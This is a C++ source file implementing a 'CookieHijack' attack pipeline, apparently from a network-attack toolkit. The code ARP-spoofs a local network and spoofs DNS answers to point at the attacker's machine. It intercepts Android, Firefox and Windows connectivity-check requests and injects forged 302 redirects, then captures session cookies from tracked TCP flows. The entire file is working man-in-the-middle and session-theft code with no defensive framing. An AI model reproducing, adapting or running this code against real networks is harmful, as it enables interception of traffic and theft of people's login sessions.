#include "cookiehijack.h"

CookieHijack::CookieHijack(QObject* parent) : GGraph(parent) {
	QObject::connect(&autoArpSpoof_, &GAutoArpSpoof::captured, &dnsBlock_, &GDnsBlock::block, Qt::DirectConnection);

	// 40 : minimum value of ip header size + tcp header size
	find_.findItems_.push_back(new GFindItem(this, 40, -1, 1, "GET /generate_204 HTTP/1.")); // Android
	find_.findItems_.push_back(new GFindItem(this, 40, -1, 1, "GET /success.txt?ipv4 HTTP/1.")); // Firefox
	find_.findItems_.push_back(new GFindItem(this, 40, -1, 1, "GET /connecttest.txt HTTP/1.")); // Windows
	find_.findItems_.push_back(new GFindItem(this, 40, -1, 1, "GET /redirect HTTP/1.")); // Windows

	tcpBlock_.forwardBlockType_ = GTcpBlock::Rst;
	tcpBlock_.backwardBlockType_ = GTcpBlock::Fin;
	// tcpBlock_.backwardFinMsg_ // set in doOpen

	cookieHijack_.tcpFlowMgr_ = &tcpFlowMgr_;

	bpFilter_.filter_ = "!(tcp port 80 or udp port 53)";

	QObject::connect(&autoArpSpoof_, &GAutoArpSpoof::captured, &find_, &GFind::find, Qt::DirectConnection);
	QObject::connect(&find_, &GFind::found, &tcpBlock_, &GTcpBlock::block, Qt::DirectConnection);

	QObject::connect(&autoArpSpoof_, &GAutoArpSpoof::captured, &dnsBlock_, &GDnsBlock::block, Qt::DirectConnection);

	QObject::connect(&autoArpSpoof_, &GAutoArpSpoof::captured, &tcpFlowMgr_, &GTcpFlowMgr::manage, Qt::DirectConnection);
	QObject::connect(&tcpFlowMgr_, &GTcpFlowMgr::managed, &cookieHijack_, &GCookieHijack::hijack, Qt::DirectConnection);

	QObject::connect(&autoArpSpoof_, &GAutoArpSpoof::captured, &bpFilter_, &GBpFilter::filter, Qt::DirectConnection);
	QObject::connect(&bpFilter_, &GBpFilter::filtered, &block_, &GBlock::block, Qt::DirectConnection);

	QObject::connect(&cookieHijack_, &GCookieHijack::hijacked, &webServer_, &WebServer::doHijacked);

	nodes_.append(&webServer_);
	nodes_.append(&autoArpSpoof_);
	nodes_.append(&find_);
	nodes_.append(&tcpBlock_);
	nodes_.append(&dnsBlock_);
	nodes_.append(&tcpFlowMgr_);
	nodes_.append(&cookieHijack_);
	nodes_.append(&bpFilter_);
	nodes_.append(&block_);
}

CookieHijack::~CookieHijack() {
	close();
}

bool CookieHijack::doOpen() {
	QString intfName = autoArpSpoof_.intfName_;
	GIntf* intf = GNetInfo::instance().intfList().findByName(intfName);
	if (intf == nullptr) {
		QString msg = QString("can not find interface for %1").arg(intfName);
		SET_ERR(GErr::ValueIsNull, msg);
		return false;
	}

	tcpBlock_.writer_.intfName_ = intfName;
	dnsBlock_.writer_.intfName_ = intfName;

	if (httpSiteList_.size() == 0) {
		SET_ERR(GErr::ValueIsZero, "httpSiteList must have at least one site");
		return false;
	}

	QString hackingSite = httpSiteList_.at(0);
	tcpBlock_.backwardFinMsg_ = getHttpResponse(0);

	dnsBlock_.dnsBlockItems_.clear();
	if (prefix_ != "") {
		dnsBlock_.dnsBlockItems_.push_back(new GDnsBlockItem(this, prefix_ + ".*", QString(intf->ip())));
		dnsBlock_.dnsBlockItems_.push_back(new GDnsBlockItem(this, "_*", QString(intf->ip()))); // _4433._https.wifi.naver.com
	}

	bool res = GGraph::doOpen();
	if (!res) return false;

	return true;
}

bool CookieHijack::doClose() {
	bool res = GGraph::doClose();

	return res;
}

QStringList CookieHijack::getHttpResponse(int siteNo)
{
	QString hackingSite;
	bool ssl;
	if (siteNo < httpSiteList_.size()) {
		ssl = false;
		hackingSite = httpSiteList_.at(siteNo);
	} else {
		ssl = true;
		int sslIndex = siteNo - httpSiteList_.size();
		if (sslIndex < httpsSiteList_.size()) {
			hackingSite = httpsSiteList_.at(sslIndex);
		}
	}
	if (hackingSite == "")
		return QStringList();

	QString scheme = ssl ? "https" : "http";
	QString status = ssl ? "ssl" : "tcp";

	QStringList res;
	res += "HTTP/1.1 302 " + status;
	QString locationStr;
	int port = ssl ? webServer_.httpsPort_ : webServer_.httpPort_;
	if (prefix_ == "")
		locationStr = QString("Location: %1://%2").arg(scheme).arg(hackingSite);
	else
		locationStr = QString("Location: %1://%2.%3").arg(scheme).arg(prefix_).arg(hackingSite);
	if (port != 80 && port != 443) locationStr += ":" + QString::number(port);
	locationStr += "/" + QString::number(siteNo) + "/" + status;
	res += locationStr;
	res += "Connection: close";
	res += "";
	res += "";

	return res;
}

void CookieHijack::propLoad(QJsonObject jo) {
	GProp::propLoad(jo);
}

void CookieHijack::propSave(QJsonObject& jo) {
	GProp::propSave(jo);
}
